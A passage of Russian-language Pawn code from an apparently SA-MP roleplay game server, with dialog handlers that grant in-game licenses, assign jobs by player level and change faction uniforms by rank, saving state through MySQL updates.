					ShowPlayerDialogEx(playerid, 558, DIALOG_STYLE_INPUT, "Выдать лицензию на рыболовлю", "Введите ID того, кому вы хотите выдать лицензию", "Выдать", "Отмена");
					return false;
				}
			case 3:
				{
					ShowPlayerDialogEx(playerid, 559, DIALOG_STYLE_INPUT, "Выдать лицензию на вождение водного транспорта", "Введите ID того, кому вы хотите выдать лицензию", "Выдать", "Отмена");
					return false;
				}
			case 4:
				{
					ShowPlayerDialogEx(playerid, 561, DIALOG_STYLE_INPUT, "Выдать комплект всех лицензий", "Введите ID того, кому вы хотите выдать лицензию", "Выдать", "Отмена");
					return false;
				}
			case 5:
				{
					ShowPlayerDialogEx(playerid, 560, DIALOG_STYLE_INPUT, "Выдать лицензию на оружие", "Введите ID того, кому вы хотите выдать лицензию", "Выдать", "Отмена");
					return false;
				}
			case 6:
				{
					ShowPlayerDialogEx(playerid, 562, DIALOG_STYLE_INPUT, "Выдать лицензию на бизнес", "Введите ID того, кому вы хотите выдать лицензию", "Выдать", "Отмена");
					return false;
				}
			}
		}
	case 556:
		{
			if(!response) return true;
			new idd = strval(inputtext);
			if(idd == INVALID_PLAYER_ID)
			{
				SCM(playerid, COLOR_GREY, " Такого игрока нет на сервере!");
				return true;
			}
			if(PlayerInfo[idd][pCarLic] == 1)
			{
				SCM(playerid, COLOR_GREY, " У этого игрока есть права!");
				return true;
			}
			format(string, 128, " Вы выдали права %s[%i].",Name(idd), idd);
			SCM(playerid, COLOR_BLUE, string);
			PlayerInfo[idd][pCarLic] = 1;
			SendMes(idd, COLOR_BLUE, " %s Выдал вам водительские права",Name(playerid));
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCarLic = '%i' WHERE name = '%e'", PlayerInfo[idd][pCarLic], PlayerInfo[idd][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 557:
		{
			if(!response) return true;
			new idd = strval(inputtext);
			if(idd == INVALID_PLAYER_ID)
			{
				SCM(playerid, COLOR_GREY, " Такого игрока нет на сервере!");
				return true;
			}
			if(PlayerInfo[idd][pFlyLic] == 1)
			{
				SCM(playerid, COLOR_GREY,  "У этого игрока есть лицензия на полёты!");
				return true;
			}
			format(string, 128, " Вы выдали лицензию на полёты %s[%i].",Name(idd), idd);
			SCM(playerid, COLOR_BLUE, string);
			PlayerInfo[idd][pFlyLic] = 1;
			SendMes(idd, COLOR_BLUE, " %s Выдал вам лицензию на полёты",Name(playerid));
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pFlyLic = '%i' WHERE name = '%e'", PlayerInfo[idd][pFlyLic], PlayerInfo[idd][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 558:
		{
			if(!response) return true;
			new idd = strval(inputtext);
			if(idd == INVALID_PLAYER_ID)
			{
				SCM(playerid, COLOR_GREY, " Такого игрока нет на сервере!");
				return true;
			}
			if(PlayerInfo[idd][pFishLic] == 1)
			{
				SCM(playerid, COLOR_GREY, " У этого игрока есть разрешение на рыболовство!");
				return true;
			}
			format(string, 128, " Вы выдали лицензию на рыболовлю %s[%i].",Name(idd), idd);
			SCM(playerid, COLOR_BLUE, string);
			PlayerInfo[idd][pFishLic] = 1;
			SendMes(idd, COLOR_BLUE, " %s Выдал вам разрешение на рыболовство.",Name(playerid));
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pFishLic = '%i' WHERE name = '%e'", PlayerInfo[idd][pFishLic], PlayerInfo[idd][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 559:
		{
			if(!response) return true;
			new idd = strval(inputtext);
			if(idd == INVALID_PLAYER_ID)
			{
				SCM(playerid, COLOR_GREY, " Такого игрока нет на сервере!");
				return true;
			}
			if(PlayerInfo[idd][pBoatLic] == 1)
			{
				SCM(playerid, COLOR_GREY, " У этого игрока есть лицензия на лодку!");
				return true;
			}
			format(string, 128, " Вы выдали лицензию на лодку %s[%i].",Name(idd), idd);
			SCM(playerid, COLOR_BLUE, string);
			PlayerInfo[idd][pBoatLic] = 1;
			SendMes(idd, COLOR_BLUE, " %s Выдал вам лицензию на морской транспорт",Name(playerid));
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pBoatLic = '%i' WHERE name = '%e'", PlayerInfo[idd][pBoatLic], PlayerInfo[idd][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 560:
		{
			if(!response) return true;
			new idd = strval(inputtext);
			if(idd == INVALID_PLAYER_ID)
			{
				SCM(playerid, COLOR_GREY, " Такого игрока нет на сервере!");
				return true;
			}
			if(PlayerInfo[idd][pGunLic] == 1)
			{
				SCM(playerid, COLOR_GREY, " У этого игрока есть лицензия на оружие!");
				return true;
			}
			format(string, 128, " Вы выдали лицензию на оружие %s[%i].",Name(idd), idd);
			SCM(playerid, COLOR_BLUE, string);
			PlayerInfo[idd][pGunLic] = 1;
			SendMes(idd, COLOR_BLUE, " %s Выдал вам лицензию на оружие",Name(playerid));
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pGunLic = '%i' WHERE name = '%e'", PlayerInfo[idd][pGunLic], PlayerInfo[idd][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 561:
		{
			if(!response) return true;
			new idd = strval(inputtext);
			if(idd == INVALID_PLAYER_ID)
			{
				SCM(playerid, COLOR_GREY, " Такого игрока нет на сервере!");
				return true;
			}
		    if(PlayerInfo[idd][pCarLic] || PlayerInfo[idd][pFishLic] || PlayerInfo[idd][pBoatLic] || PlayerInfo[idd][pFlyLic] || PlayerInfo[idd][pGunLic] || PlayerInfo[idd][pBizLic])
		    {
                SCM(playerid, COLOR_GREY, " У игрока есть весь комплект лицензий!");
				return true;
		    }
			format(string, 128, " Вы выдали все лицензии игроку %s[%i].",Name(idd), idd);
			SCM(playerid, COLOR_BLUE, string);
			PlayerInfo[idd][pCarLic] = 1;
			PlayerInfo[idd][pFishLic] = 1;
			PlayerInfo[idd][pBoatLic] = 1;
			PlayerInfo[idd][pFlyLic] = 1;
			PlayerInfo[idd][pGunLic] = 1;
			PlayerInfo[idd][pBizLic] = 1;
			SendMes(idd, COLOR_BLUE, " %s Выдал вам комплект всех лицензий",Name(playerid));
			mysql_format(DATABASE,QUERY,230, "UPDATE `"TABLE_ACCOUNTS"` SET pCarLic = '%i', pFishLic = '%i', pBoatLic = '%i', pFlyLic = '%i', pGunLic = '%i', pBizLic = '%i' WHERE name = '%e'", PlayerInfo[idd][pCarLic], PlayerInfo[idd][pFishLic], PlayerInfo[idd][pBoatLic], PlayerInfo[idd][pFlyLic], PlayerInfo[idd][pGunLic], PlayerInfo[idd][pBizLic], PlayerInfo[idd][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 562:
		{
			if(!response) return true;
			new idd = strval(inputtext);
			if(idd == INVALID_PLAYER_ID)
			{
				SCM(playerid, COLOR_GREY, " Такого игрока нет на сервере!");
				return true;
			}
			if(PlayerInfo[idd][pBizLic] == 1)
			{
				SCM(playerid, COLOR_GREY, " У этого игрока есть лицензия на бизнес!");
				return true;
			}
			format(string, 128, " Вы выдали лицензию на бизнес %s[%i].",Name(idd), idd);
			SCM(playerid, COLOR_BLUE, string);
			PlayerInfo[idd][pBizLic] = 1;
			SendMes(idd, COLOR_LIGHTBLUE, " %s Выдал вам лицензию на бизнес",Name(playerid));
		}
	case 10098:
		{
			if(!response) return useguns[playerid] = 0;
			useguns[playerid] = 0;
			if(PlayerInfo[playerid][pMember] != 0 && GetPVarInt(playerid, "Fraction_Duty")) return SCM(playerid, COLOR_GRAD1, " Вы состоите в организации");
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pLevel] < 2) return	SCM(playerid, COLOR_GRAD1, " Вам требуется 2 лвл");
					PlayerInfo[playerid][pJob] = 1;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Водителя автобуса");
					SCM(playerid, 0x6495EDFF, " (( Команды: /route - закончить работу водителя автобуса ))");
	                mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
				}
			case 1:
				{
					if(PlayerInfo[playerid][pLevel] < 2) return SCM(playerid, COLOR_GRAD1, " Вам требуется 2 лвл");
					PlayerInfo[playerid][pJob] = 4;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Таксиста");
                    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
					return true;
				}
			case 2:
				{
					if(PlayerInfo[playerid][pLevel] < 2) return	SCM(playerid, COLOR_GRAD1, " Вам требуется 2 лвл");
					PlayerInfo[playerid][pJob] = 3;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Продавца хот догов (( Используйте /gps чтобы найти стоянку машин Хот Догов ))");
					SCM(playerid, 0x6495EDFF, " (( Команды: /hcontract - подписать контракт с закусочной,  /selleat - продать хот дог ))");
					SCM(playerid, 0x6495EDFF, " (( Команды: /hcounter - начать работу за прилавком на вокзале ))");
					SCM(playerid, 0x6495EDFF, " (( Чтобы подписать контракт с закусочной, подойдите ко входу Burger, Pizza, Cluc и введите команду /hcontract ))");
                    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
				}
			case 3:
				{
					if(PlayerInfo[playerid][pLevel] < 3) return	SCM(playerid, COLOR_GRAD1, " Вам требуется 3 лвл");
					PlayerInfo[playerid][pJob] = 5;
					if(PlayerInfo[playerid][pPSkill] == 0) PlayerInfo[playerid][pPSkill] = 1;
					if(PlayerInfo[playerid][pPSkill] == 1) PlayerInfo[playerid][pPMGruz] = 200;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Развозчика продуктов");
					SCM(playerid, 0x6495EDFF, " (( Команды: /prodmenu ))");
                    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
					return true;
				}
			case 4:
				{
					if(PlayerInfo[playerid][pLevel] < 3) return SCM(playerid, COLOR_GRAD1, " Вам требуется 3 лвл");
					PlayerInfo[playerid][pJob] = 2;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Механика");
					SCM(playerid, 0x6495EDFF, " (( Команды: /refill - заправить, /repair - починить, /fillGarage, /mcontract - подписать контракт с Бензозаправкой ))");
                    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
					return true;
				}
			case 5:
				{
					if(PlayerInfo[playerid][pLevel] < 5) return	SCM(playerid, COLOR_GRAD1, " Вам требуется 5 лвл");
					PlayerInfo[playerid][pJob] = 9;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Прораба");
					SCM(playerid, 0x6495EDFF, " (( Ваш заработок зависит от того сколько у вас рабочих, и как они работают ))");
					SCM(playerid, 0x6495EDFF, " (( За 1 ящик, перетащенный рабочим, вы получаете 25 вирт ))");
					SCM(playerid, 0x6495EDFF, " (( Команды: /gcontract - предложить работу,  /getpayday - получения прибыли с рабочего ))");
                    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
					return true;
				}
			case 6:
				{
					if(PlayerInfo[playerid][pLevel] < 6) return	SCM(playerid, COLOR_GRAD1, " Вам требуется 6 лвл");
					PlayerInfo[playerid][pJob] = 6;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Тренера");
					SCM(playerid, 0x6495EDFF, " (( Команды: /fgstyle - обучение стилям боя ))");
                    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
					return true;
				}
			case 7:
				{
					if(PlayerInfo[playerid][pLevel] < 6) return SCM(playerid, COLOR_GRAD1, " Вам требуется 6 лвл");
					PlayerInfo[playerid][pJob] = 99;
					if(PlayerInfo[playerid][pDLevel] == 1) PlayerInfo[playerid][pDMgruz] = 7;
					SCM(playerid, 0x6495EDFF, " Вас успешно приняли на работу Дальнобойщика");
					SCM(playerid, 0x6495EDFF, " Чтобы начать работы, езжайте на стоянку аренды машин (( /gps ))");
					SCM(playerid, 0x6495EDFF, " (( Команды: /truck ))");
                    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET  pJob = '%i' WHERE name = '%e'", PlayerInfo[playerid][pJob], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
					return true;
				}
			}
		}
	case 1010:
		{
			if(!response) return true;
			SCM(playerid, COLOR_BLUE, " Рабочий день начат");
			SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			SetPlayerToTeamColor(playerid);
			SetPVarInt(playerid,"Fraction_Duty",1);
			return true;
		}
	case 1011:
		{
			if(!response) return true;
			if(listitem == 0)
			{
				SCM(playerid, COLOR_BLUE, " Рабочий день окончен");
				SetPlayerSkin(playerid, PlayerInfo[playerid][pChar][0]);
				SetPlayerColor(playerid, TEAM_HIT_COLOR);
				DeletePVar(playerid,"Fraction_Duty");
				SetPlayerArmourAC(playerid,0);
				ResetPlayerWeaponsEx(playerid);
				Update3DTextLabelText(LabelRank[playerid], TEAM_GROVE_COLOR, "");
			}
			else if(listitem == 1)
			{
				if(PlayerInfo[playerid][pMember] == 1)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}LSPD | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}Los Santos Police Officer | {AE433D}1 ранг\n\
                    {AE433D}2. {FFFFFF}Stewardess | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}LSPD Motorbike Cop | {AE433D}2 ранг\n\
					{AE433D}4. {FFFFFF}Los Santos Police Officer | {AE433D}14 ранг\n\
					{AE433D}5. {FFFFFF}Los Santos Police Officer | {AE433D}14 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 2)
				{
				    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}FBI | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}Federal Agent | {AE433D}1 ранг\n\
				    {AE433D}2. {FFFFFF}Businesswoman  | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}Black Bouncer | {AE433D}2 ранг\n\
					{AE433D}4. {FFFFFF}White Bouncer | {AE433D}2 ранг\n\
					{AE433D}5. {FFFFFF}White MIB agent | {AE433D}14 ранг\n\
					{AE433D}6. {FFFFFF}Black MIB agent | {AE433D}14 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 3)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}ArmySF | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}San Andreas Army | {AE433D}1 ранг\n\
			 	    {AE433D}2. {FFFFFF}Helena Wankstein | {AE433D}1 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22)
				{
                     ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}Medics | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}Paramedic | {AE433D}1 ранг\n\
				    {AE433D}2. {FFFFFF}Rich Woman | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}Paramedic | {AE433D}1 ранг\n\
					{AE433D}4. {FFFFFF}Paramedic | {AE433D}2 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 7)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}Maria | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF} Oriental Ped | {AE433D}1 ранг\n\
                    {AE433D}2. {FFFFFF} Businesswoman | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF} Businessman | {AE433D}2 ранг\n\
					{AE433D}4. {FFFFFF} Normal Ped | {AE433D}4 ранг\n\
					{AE433D}5. {FFFFFF} Businessman | {AE443D}4 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 9)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}News SF | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}Normal Ped | {AE433D}1 ранг\n\
                    {AE433D}2. {FFFFFF}Clothes shop staff | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}Clothes shop staff | {AE433D}4 ранг\n\
					{AE433D}4. {FFFFFF}Cab driver | {AE433D}9 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 10)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}SFPD | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}San Fierro Police Officer | {AE433D}1 ранг\n\
                    {AE433D}2. {FFFFFF}Stewardess | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}SFPD Motorbike Cop | {AE433D}2 ранг\n\
					{AE433D}4. {FFFFFF}San Fierro Police Officer | {AE433D}14 ранг\n\
					{AE433D}5. {FFFFFF}San Fierro Police Officer | {AE433D}14 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 11)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}AutoSchool | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}The D.A | {AE433D}1 ранг\n\
					{AE433D}2. {FFFFFF}Casino croupier | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}Valet | {AE433D}3 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 16)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}News LS | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}Normal Ped | {AE433D}1 ранг\n\
                    {AE433D}2. {FFFFFF}Clothes shop staff | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}Clothes shop staff | {AE433D}4 ранг\n\
					{AE433D}4. {FFFFFF}Cab driver | {AE433D}9 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 19)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}ArmySF | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}San Andreas Army | {AE433D}1 ранг\n\
			 	    {AE433D}2. {FFFFFF}Helena Wankstein | {AE433D}1 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 20)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}News LV | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}Normal Ped | {AE433D}1 ранг\n\
                    {AE433D}2. {FFFFFF}Clothes shop staff | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}Clothes shop staff | {AE433D}4 ранг\n\
					{AE433D}4. {FFFFFF}Cab driver | {AE433D}9 ранг", ">>", "x");
				}
				else if(PlayerInfo[playerid][pMember] == 21)
				{
                    ShowPlayerDialogEx(playerid, 1013, DIALOG_STYLE_LIST, "{AE433D}LVPD | {FFFFFF}Смена фракционной одежды", "{AE433D}1. {FFFFFF}Las Venturas Police Officer | {AE433D}1 ранг\n\
                    {AE433D}2. {FFFFFF}Stewardess | {AE433D}1 ранг\n\
					{AE433D}3. {FFFFFF}LVPD Motorbike Cop | {AE433D}2 ранг\n\
					{AE433D}4. {FFFFFF}Las Venturas Police Officer | {AE433D}14 ранг\n\
					{AE433D}5. {FFFFFF}Las Venturas Officer | {AE433D}14 ранг", ">>", "x");
				}
			}
			return true;
		}
	case 1013:
		{
           if(response)
		   {
			   if(PlayerInfo[playerid][pMember] == 1)
			   {
				   switch(listitem)
				   {
						case 0:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            SetPlayerSkin(playerid, JoinPed[0][0]);
						}
						case 1:
						{
                            if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женщин!");
                            SetPlayerSkin(playerid, JoinPed[1][0]);
						}
						case 2:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 2) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[2][0]);
						}
						case 3:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[3][0]);
						}
						case 4:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[4][0]);
						}
				   }
			   }
	           else if(PlayerInfo[playerid][pMember] == 2)
		       {
                   switch(listitem)
		           {
						case 0:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
							SetPlayerSkin(playerid, JoinPed[5][0]);
						}
						case 1:
						{
							if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женщин!");
                            SetPlayerSkin(playerid, JoinPed[10][0]);
						}
						case 2:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
	                        if(PlayerInfo[playerid][pRank] == 2) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
	                        SetPlayerSkin(playerid, JoinPed[6][0]);
						}
						case 3:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
	                        if(PlayerInfo[playerid][pRank] == 2) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
	                        SetPlayerSkin(playerid, JoinPed[7][0]);
						}
						case 4:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
	                        if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
						    SetPlayerSkin(playerid, JoinPed[8][0]);
						}
						case 5:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
	                        if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
						    SetPlayerSkin(playerid, JoinPed[9][0]);
						}
		           }
		       }
		       else if(PlayerInfo[playerid][pMember] == 3)
		       {
					switch(listitem)
					{
						case 0:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            SetPlayerSkin(playerid, JoinPed[11][0]);
						}
					    case 1:
					    {
                            if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женщин!");
                            SetPlayerSkin(playerid, JoinPed[12][0]);
					    }
					}
		       }
		       else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22)
		       {
				    switch(listitem)
					{
						case 0:
					 	{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             SetPlayerSkin(playerid, JoinPed[13][0]);
						}
						case 1:
						{
                             if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женчин!");
                             SetPlayerSkin(playerid, JoinPed[16][0]);
						}
						case 2:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             SetPlayerSkin(playerid, JoinPed[14][0]);
						}
						case 3:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] == 2) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[15][0]);
						}
		           }
               }
               else if(PlayerInfo[playerid][pMember] == 7)
               {
					switch(listitem)
					{
						 case 0:
					 	 {
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             SetPlayerSkin(playerid, JoinPed[26][0]);
						 }
						 case 1:
						 {
                             if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женчин!");
                             SetPlayerSkin(playerid, JoinPed[28][0]);
						 }
						 case 2:
						 {
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] > 4) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[27][0]);
						 }
						 case 3:
						 {
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] > 9) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[29][0]);
						 }
						 case 4:
						 {
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] > 4) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[30][0]);
						 }
					}
               }
			   else if(PlayerInfo[playerid][pMember] == 9)
			   {
		            switch(listitem)
					{
						case 0:
					 	{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             SetPlayerSkin(playerid, JoinPed[39][0]);
						}
						case 1:
						{
                             if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женчин!");
                             SetPlayerSkin(playerid, JoinPed[41][0]);
						}
						case 2:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] == 4) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[42][0]);
						}
						case 3:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] == 9) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[40][0]);
						}
		           }
			   }
               else if(PlayerInfo[playerid][pMember] == 10)
	           {
			       switch(listitem)
				   {
						case 0:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            SetPlayerSkin(playerid, JoinPed[31][0]);
						}
						case 1:
						{
                            if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женщин!");
                            SetPlayerSkin(playerid, JoinPed[1][0]);
						}
						case 2:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 2) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[2][0]);
						}
						case 3:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[3][0]);
						}
						case 4:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[4][0]);
						}
				   }
			   }
	           else if(PlayerInfo[playerid][pMember] == 11)
		       {
 					switch(listitem)
					{
						case 0:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            SetPlayerSkin(playerid, JoinPed[43][0]);
						}
					    case 1:
					    {
                            if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женщин!");
                            SetPlayerSkin(playerid, JoinPed[44][0]);
					    }
						case 2:
						{
